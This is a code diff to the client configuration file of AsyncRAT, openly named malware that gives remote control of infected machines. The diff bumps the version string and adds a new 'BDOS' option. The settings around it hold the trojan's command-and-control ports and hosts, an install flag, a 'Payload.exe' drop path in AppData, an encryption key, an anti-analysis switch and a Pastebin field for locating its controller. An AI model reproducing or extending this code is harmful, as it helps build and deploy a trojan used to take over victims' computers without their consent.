@@ -12,7 +12,7 @@ namespace Client
 #if DEBUG
         public static string Ports = "6606";
         public static string Hosts = "127.0.0.1";
-        public static string Version = "AsyncRAT 0.4.8d";
+        public static string Version = "AsyncRAT 0.4.9C";
         public static string Install = "false";
         public static string ClientFullPath = Path.Combine(Environment.ExpandEnvironmentVariables("%AppData%"), "Payload.exe");
         public static string Key = "NYAN CAT";
@@ -23,10 +23,12 @@ namespace Client
         public static string Anti = "false";
         public static Aes256 aes256 = new Aes256(Key);
         public static string Pastebin = "null";
+        public static string BDOS = "false";
+
 #else
         public static string Ports = "%Ports%";
         public static string Hosts = "%Hosts%";
-        public static string Version = "AsyncRAT 0.4.9B";
+        public static string Version = "AsyncRAT 0.4.9C";
         public static string Install = "%Install%";
         public static string ClientFullPath = Path.Combine(Environment.ExpandEnvironmentVariables("%Folder%"), "%File%");
         public static string Key = "%Key%";
@@ -37,6 +39,7 @@ namespace Client
         public static readonly string Anti = "%Anti%";
         public static Aes256 aes256;
         public static string Pastebin = "%Pastebin%";
+        public static string BDOS = "%BDOS%";
 #endif
 
 
